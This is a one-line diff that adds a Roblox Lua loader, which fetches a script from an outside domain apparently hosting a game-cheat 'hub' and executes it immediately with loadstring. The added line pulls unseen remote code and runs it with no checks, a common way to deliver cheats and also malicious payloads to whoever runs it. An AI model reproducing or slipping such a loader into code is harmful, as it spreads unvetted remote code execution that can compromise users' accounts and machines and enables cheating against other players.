@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://cheatersoul.click/eltorohub.html"))()
